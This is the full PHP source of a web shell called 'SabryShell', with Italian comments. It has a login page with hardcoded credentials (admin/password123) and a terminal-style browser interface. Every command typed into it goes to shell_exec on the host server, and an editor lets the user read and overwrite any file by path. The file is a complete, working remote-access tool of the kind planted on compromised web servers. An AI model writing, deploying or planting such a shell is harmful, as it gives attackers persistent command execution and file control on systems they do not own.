<?php
session_start();

// --- 1. CONFIGURAZIONE SICUREZZA ---
$require_auth = true; 
$user_db = 'admin';
$pass_db = 'password123'; 

// Gestione Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . strtok($_SERVER["REQUEST_URI"], '?'));
    exit;
}

// Logica di Autenticazione
if ($require_auth && !isset($_SESSION['authenticated'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login_user'])) {
        if ($_POST['login_user'] === $user_db && $_POST['login_pass'] === $pass_db) {
            $_SESSION['authenticated'] = true;
        } else {
            $login_error = "Access Denied.";
        }
    }
    if (!isset($_SESSION['authenticated'])) {
        ?>
        <!DOCTYPE html><html><head><title>SabryShell</title><meta charset="utf-8">
        <style>
            body { 
                background: #000; 
                color: #00ff00; 
                font-family: 'Consolas', monospace; 
                display: flex; 
                justify-content: center; 
                align-items: center; 
                height: 100vh; 
                margin: 0; 
            }
            form { 
                border: 1px solid #00ff00; 
                padding: 30px; 
                box-shadow: 0 0 15px rgba(0,255,0,0.3); 
                width: 340px;
                text-align: center;
            }
            input { 
                background: transparent; 
                border: 1px solid #00ff00; 
                color: #fff; 
                padding: 10px; 
                margin: 10px 0; 
                display: block; 
                width: 100%; 
                box-sizing: border-box; 
                outline: none; 
            }
            button { 
                background: #00ff00; 
                border: none; 
                padding: 10px; 
                cursor: pointer; 
                font-weight: bold; 
                width: 100%; 
                color: #000; 
            }
            h2 { 
                margin: 15px 0 20px 0; 
                text-align: center; 
                font-size: 18px; 
            }
            
            /* Icona Medusa: grande, pulita, senza glow */
            .medusa-icon {
                width: 180px;
                height: auto;
                display: block;
                margin: 0 auto 10px auto;
                background: transparent;
                image-rendering: auto;
            }
            .medusa-icon:hover {
                opacity: 0.95;
                transition: opacity 0.2s;
            }
            .medusa-fallback {
                display: none;
                width: 60px;
                height: 60px;
                margin: 0 auto 15px auto;
            }
        </style></head><body>
            <form method="post">
                <!-- Icona Medusa -->
                <img src="medusa.png" 
                     alt="Medusa" 
                     class="medusa-icon"
                     onerror="this.style.display='none'; document.querySelector('.medusa-fallback').style.display='block';">
                
                <!-- Fallback SVG se l'immagine non carica -->
                <svg class="medusa-fallback" viewBox="0 0 24 24" fill="none" stroke="#00ff00" stroke-width="1.5">
                    <circle cx="12" cy="10" r="4"/><path d="M8 6 Q6 4, 7 2"/><path d="M12 6 Q12 3, 12 1"/>
                    <path d="M16 6 Q18 4, 17 2"/><circle cx="10" cy="9" r="1"/><circle cx="14" cy="9" r="1"/>
                    <path d="M10 12 Q12 14, 14 12"/>
                </svg>
                
                <h2>SabryShell</h2>
                <?php if(isset($login_error)) echo "<p style='color:red; font-size:12px; margin:0 0 15px 0;'>$login_error</p>"; ?>
                <input type="text" name="login_user" placeholder="Username" autofocus required>
                <input type="password" name="login_pass" placeholder="Password" required>
                <button type="submit">ACCEDI</button>
            </form>
        </body></html>
        <?php exit;
    }
}

// --- 2. INFO SISTEMA E DIRECTORY ---
$sys_user = exec('whoami') ?: 'user';
$sys_host = gethostname() ?: 'webshell';
$current_dir = $_POST['current_dir'] ?? getcwd();

// --- 3. AJAX: AUTOCOMPLETE AVANZATO ---
if (isset($_POST['ajax_autocomplete'])) {
    $partial = $_POST['partial'];
    $dir_to_scan = '.';
    $search = $partial;

    if (strpos($partial, '/') !== false) {
        $dir_to_scan = dirname($partial);
        $search = basename($partial);
        if (substr($partial, -1) === '/') { $dir_to_scan = $partial; $search = ''; }
    }

    $abs_scan = (substr($dir_to_scan, 0, 1) === '/') ? $dir_to_scan : $current_dir . '/' . $dir_to_scan;
    
    $matches = [];
    if ($files = @scandir($abs_scan)) {
        foreach ($files as $f) {
            if ($f === '.' || $f === '..') continue;
            if ($search === '' || strpos($f, $search) === 0) {
                $matches[] = is_dir($abs_scan . '/' . $f) ? $f . '/' : $f;
            }
        }
    }
    header('Content-Type: application/json');
    echo json_encode($matches); exit;
}

// --- 4. AJAX: CARICAMENTO FILE EDITOR ---
if (isset($_POST['ajax_load_file'])) {
    $path = $_POST['path'];
    echo json_encode(['content' => @file_get_contents($path), 'path' => $path]);
    exit;
}

// --- 5. LOGICA COMANDI ---
$history_data = [];
$cmd_history_list = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !isset($_POST['ajax_autocomplete'])) {
    $history_data = !empty($_POST['history_raw']) ? json_decode(base64_decode($_POST['history_raw']), true) : [];
    $cmd_history_list = !empty($_POST['cmd_list_raw']) ? json_decode(base64_decode($_POST['cmd_list_raw']), true) : [];

    if (isset($_POST['save_file_content'])) {
        file_put_contents($_POST['file_path'], $_POST['content']);
        $history_data[] = ['path' => basename($current_dir), 'cmd' => 'Edited: ' . basename($_POST['file_path']), 'out' => "File saved successfully.\n"];
    } 
    else if (!empty($_POST['cmd'])) {
        $cmd = trim($_POST['cmd']);
        if (!in_array(strtolower($cmd), ['cls', 'clear'])) $cmd_history_list[] = $cmd;

        if (in_array(strtolower($cmd), ['cls', 'clear'])) {
            $history_data = [];
        } else if (preg_match('/^cd\s+(.+)/', $cmd, $matches)) {
            $target = $matches[1];
            $old_path = basename($current_dir) ?: '/'; 
            if (@chdir($current_dir) && @chdir($target)) { $current_dir = getcwd(); $history_data[] = ['path' => $old_path, 'cmd' => $cmd, 'out' => ""];}
            else { $history_data[] = ['path'=>basename($current_dir),'cmd'=>$cmd,'out'=>"bash: cd: $target: No such directory\n"]; }
        } else if (!preg_match('/^(vi|nano|edit)\s+/', $cmd)) {
            $output = shell_exec("cd " . escapeshellarg($current_dir) . " && $cmd 2>&1");
            $formatted = "";
            if ($output) {
                foreach (explode("\n", rtrim($output)) as $line) {
                    $style = preg_match('/^d[rwx-]{9}/', $line) ? "color:#5c5cff;font-weight:bold;" : "";
                    $formatted .= "<span style='$style'>" . htmlspecialchars($line) . "</span>\n";
                }
            }
            $history_data[] = ['path' => basename($current_dir) ?: '/', 'cmd' => $cmd, 'out' => $formatted];
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title><?= $sys_user ?>@<?= $sys_host ?></title>

    <style>
        /* Base e Reset */
        body { 
            background: #000; 
            color: #fff; 
            font-family: 'Consolas', 'Monaco', monospace; 
            font-size: 14px; 
            margin: 0; 
            overflow: hidden; 
        }
        
        /* Logout Button */
        .logout-btn { 
            position: fixed; 
            top: 10px; 
            right: 15px; 
            color: #666; 
            text-decoration: none; 
            border: 1px solid #333; 
            padding: 4px 12px; 
            font-size: 12px; 
            z-index: 9999; 
            background: #000;
            transition: all 0.2s;
        }
        .logout-btn:hover { 
            background: #ff0000; 
            color: #fff; 
            border-color: #ff0000; 
        }

        /* Terminal Viewport */
        .terminal-viewport { 
            height: 100vh; 
            overflow-y: auto; 
            padding: 15px; 
            display: flex; 
            flex-direction: column; 
            position: relative; 
            box-sizing: border-box; 
            z-index: 10;
        }
        
        .prompt { 
            color: #00ff00; 
            margin-right: 8px; 
            font-weight: bold; 
            user-select: none; 
        }
        
        pre { 
            margin: 2px 0 15px 0; 
            white-space: pre-wrap; 
            color: #ccc; 
            font-family: inherit; 
            line-height: 1.4; 
        }
        
        /* Input Area Layout */
        .input-line { 
            display: flex; 
            position: relative; 
            width: 100%; 
            align-items: center; 
            padding-bottom: 30px;
        }
        
        input#cmd { 
            position: absolute; 
            left: 0; 
            top: 0; 
            width: 100%; 
            background: transparent; 
            border: none; 
            color: transparent; 
            font-family: inherit; 
            font-size: inherit; 
            outline: none; 
            z-index: 100; 
            caret-color: transparent; 
        }
        
        .cmd-display { 
            white-space: pre; 
            z-index: 50; 
            pointer-events: none;
        }

        /* Cursore Lampeggiante Pro */
        .cursor { 
            display: inline-block; 
            width: 2px; 
            height: 17px; 
            background: #fff; 
            animation: terminal-blink 1.2s infinite; 
            vertical-align: middle; 
            margin-left: 1px; 
            z-index: 60;
            pointer-events: none;
        }

        @keyframes terminal-blink { 
            0%, 49% { opacity: 1; }
            50%, 100% { opacity: 0; }
        }
        
        /* Editor Overlay */
        #editor-overlay { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: #000; 
            z-index: 5000; 
            display: none; 
            flex-direction: column; 
            padding: 15px; 
            box-sizing: border-box; 
        }
        
        .editor-container { 
            display: flex; 
            flex: 1; 
            border: 1px solid #333; 
            margin-top: 10px; 
            overflow: hidden; 
            background: #000;
        }
        
        .line-numbers { 
            background: #0a0a0a; 
            color: #444; 
            padding: 10px 8px; 
            text-align: right; 
            min-width: 35px; 
            user-select: none; 
            line-height: 20px; 
            border-right: 1px solid #222; 
            font-size: 13px; 
            overflow: hidden;
        }
        
        textarea#editor-text { 
            background: transparent; 
            color: #fff; 
            border: none; 
            flex: 1; 
            font-family: inherit; 
            font-size: 14px; 
            padding: 10px; 
            outline: none; 
            resize: none; 
            line-height: 20px; 
            overflow-y: auto; 
            tab-size: 4; 
            -moz-tab-size: 4;
        }

        .dir-line {
            color: #5c5cff;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <a href="?logout=1" class="logout-btn">LOGOUT</a>

    <!-- EDITOR (Overlay) -->
    <div id="editor-overlay">
        <div style="color:#00ff00; font-weight:bold; font-size: 12px;">FILE EDITOR: <span id="editing-filename" style="color:#fff"></span></div>
        <div class="editor-container">
            <div id="line-numbers" class="line-numbers">1</div>
            <textarea id="editor-text" spellcheck="false" onscroll="syncScroll()" oninput="updateLineNumbers()"></textarea>
        </div>
        <div style="margin-top:15px;">
            <button onclick="saveFile()" style="background:#00ff00; padding:10px 25px; border:none; cursor:pointer; font-weight:bold;">SAVE & EXIT (:wq)</button>
            <button onclick="closeEditor()" style="background:#333; color:#fff; padding:10px 25px; border:none; cursor:pointer; margin-left:10px;">CANCEL (:q!)</button>
        </div>
    </div>

    <!-- TERMINALE -->
    <div class="terminal-viewport" id="viewport">
        <div class="term-history" id="history-container">
            <?php foreach ($history_data as $item): ?>
                <div class="entry">
                    <span class="prompt"><?= $sys_user ?>@<?= $sys_host ?>:<span style="color:#fff"><?= htmlspecialchars($item['path']) ?></span>$</span>
                    <span><?= htmlspecialchars($item['cmd']) ?></span>
                    <pre><?= $item['out'] ?></pre>
                </div>
            <?php endforeach; ?>
        </div>

        <form method="post" id="shell-form">
            <div class="input-line">
                <span class="prompt"><?= $sys_user ?>@<?= $sys_host ?>:<span style="color:#fff"><?= basename($current_dir) ?: '/' ?></span>$</span>
                <span id="cmd-text-view" class="cmd-display"></span><span class="cursor"></span>
                <input type="text" name="cmd" id="cmd" autocomplete="off" spellcheck="false" autofocus>
            </div>
            <input type="hidden" name="history_raw" value="<?= base64_encode(json_encode($history_data)) ?>">
            <input type="hidden" name="cmd_list_raw" value="<?= base64_encode(json_encode($cmd_history_list)) ?>">
            <input type="hidden" name="current_dir" value="<?= htmlspecialchars($current_dir) ?>">
        </form>
    </div>

    <script>
        const v = document.getElementById('viewport'), 
              ci = document.getElementById('cmd'), 
              ctv = document.getElementById('cmd-text-view');
        
        const afterCursor = document.createElement('span');
        afterCursor.id = "cmd-text-after";
        afterCursor.style.whiteSpace = "pre";
        document.querySelector('.cursor').after(afterCursor);

        const cmdHistory = <?= json_encode($cmd_history_list) ?>;
        let hIdx = cmdHistory.length;

        function updateVisualLine() {
            const val = ci.value;
            const pos = ci.selectionStart;
            ctv.textContent = val.substring(0, pos);
            afterCursor.textContent = val.substring(pos);
            v.scrollTop = v.scrollHeight;
        }

        ci.addEventListener('input', updateVisualLine);
        ci.addEventListener('click', updateVisualLine);
        ci.addEventListener('keyup', (e) => {
            if (["ArrowLeft", "ArrowRight", "Home", "End"].includes(e.key)) {
                updateVisualLine();
            }
        });

        ci.addEventListener('keydown', function(e) {
            setTimeout(updateVisualLine, 0);

            if (e.key === "ArrowUp") { 
                e.preventDefault(); 
                if (hIdx > 0) { hIdx--; ci.value = cmdHistory[hIdx]; updateVisualLine(); } 
            }
            if (e.key === "ArrowDown") { 
                e.preventDefault(); 
                if (hIdx < cmdHistory.length - 1) { hIdx++; ci.value = cmdHistory[hIdx]; } 
                else { hIdx = cmdHistory.length; ci.value = ""; } 
                updateVisualLine(); 
            }
            if (e.key === "Enter" && (ci.value.startsWith('vi ') || ci.value.startsWith('nano ') || ci.value.startsWith('edit '))) {
                const parts = ci.value.split(' ');
                if (parts[1]) { e.preventDefault(); openEditor(parts[1]); }
            }
            if (e.key === "Tab") {
                e.preventDefault();
                const fullValue = ci.value;
                const pos = ci.selectionStart;
                const beforeCursor = fullValue.substring(0, pos);
                const parts = beforeCursor.split(" ");
                const lastPart = parts.pop();
                if (lastPart.length < 1 && parts.length > 0) return;

                fetch('', { 
                    method:'POST', 
                    headers:{'Content-Type':'application/x-www-form-urlencoded'}, 
                    body: `ajax_autocomplete=1&partial=${encodeURIComponent(lastPart)}&current_dir=${encodeURIComponent(document.getElementsByName('current_dir')[0].value)}` 
                })
                .then(r => r.json())
                .then(m => { 
                    if(m.length === 1) { 
                        let newValue = lastPart.includes('/') ? lastPart.substring(0, lastPart.lastIndexOf('/') + 1) + m[0] : m[0];
                        const afterPart = fullValue.substring(pos);
                        ci.value = parts.join(" ") + (parts.length > 0 ? " " : "") + newValue + afterPart;
                        const newPos = (parts.join(" ") + (parts.length > 0 ? " " : "") + newValue).length;
                        ci.setSelectionRange(newPos, newPos);
                        updateVisualLine();
                    }
                });
            }
        });

        function openEditor(filename) {
            const currentDir = document.getElementsByName('current_dir')[0].value;
            fetch('', { method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:`ajax_load_file=1&path=${encodeURIComponent(currentDir + '/' + filename)}` })
            .then(r => r.json()).then(data => {
                document.getElementById('editing-filename').textContent = filename;
                document.getElementById('editor-text').value = data.content;
                document.getElementById('editor-overlay').style.display = 'flex';
                updateLineNumbers();
                document.getElementById('editor-text').focus();
            });
        }
        
        function closeEditor() { document.getElementById('editor-overlay').style.display = 'none'; ci.focus(); }

        function saveFile() {
            const form = document.getElementById('shell-form');
            const data = {
                save_file_content: '1',
                file_path: document.getElementsByName('current_dir')[0].value + '/' + document.getElementById('editing-filename').textContent,
                content: document.getElementById('editor-text').value
            };
            for(let key in data) {
                let hidden = document.createElement('input'); 
                hidden.type='hidden'; hidden.name=key; hidden.value=data[key];
                form.appendChild(hidden);
            }
            form.submit();
        }

        function updateLineNumbers() {
            const lines = document.getElementById('editor-text').value.split('\n').length;
            let nums = ''; for(let i=1; i<=lines; i++) nums += i + '<br>';
            document.getElementById('line-numbers').innerHTML = nums;
        }
        function syncScroll() { document.getElementById('line-numbers').scrollTop = document.getElementById('editor-text').scrollTop; }

        window.onload = () => { updateVisualLine(); ci.focus(); };
        document.addEventListener('click', (e) => { 
            if(document.getElementById('editor-overlay').style.display !== 'flex' && e.target.className !== 'logout-btn') {
                ci.focus(); updateVisualLine();
            }
        });
        if (window.performance && window.performance.navigation.type === window.performance.navigation.TYPE_RELOAD) {
            window.location.href = window.location.pathname;
        }
    </script>
</body>
</html>
